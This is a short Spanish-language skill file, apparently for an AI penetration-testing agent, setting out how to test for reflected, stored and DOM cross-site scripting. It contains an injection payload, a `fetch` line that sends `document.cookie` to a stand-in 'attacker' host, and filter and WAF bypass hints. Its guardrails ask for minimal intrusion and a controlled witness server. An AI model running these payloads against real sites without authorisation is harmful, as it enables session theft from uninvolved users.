---
name: web-xss
description: 'Input reflejado/almacenado en respuesta HTML, headers, cookies, hash (DOM). Keywords: web, xss.'
area: WEB
tags: [web, xss]
license: Apache-2.0
---

# SKILL-XSS.md — Cross-Site Scripting

## Cuándo usarla
Input reflejado/almacenado en respuesta HTML, headers, cookies, hash (DOM).

## Procedimiento resumido
1. Reflejado: inyectar `"><svg/onload=alert(1)>` en parámetros; confirmar que el
   código se renderiza sin escapar en la respuesta (~L3 con execution witness).
2. Almacenado/DOM: campos que se guardan (perfil, comentarios); probar vectores DOM
   en `location.hash`, `document.write`, sinks `innerHTML`.
3. Verificación sin dañar a terceros:
   - No `alert(1)` en stored de entornos compartidos → usar witness propio
     (png request a tu servidor, `fetch('//attacker/?c='+document.cookie)`).
   - Blind XSS → callback host propio (no servicios públicos exfil).
4. Bypass de filtros/WAF: eventos alternativos, encoding, `srcdoc`, SVG/MathML,
   DOMPurifier gaps (revisar `redteam/hunt-xss`, `redteam/hunt-dom`).

## Clasificación
- Ejecución en tu navegador/session-test → L3; robo de cookies/sesión de otros → L4.

## Herramientas Kali
`curl`, Burp Suite (Repeater/Intruder), browser test.

## Guardrails
- Payloads en stored XSS pueden impactar a otros usuarios: mínima intrusión,
  usar witness controlado. Evidencia con request+response y reproducer.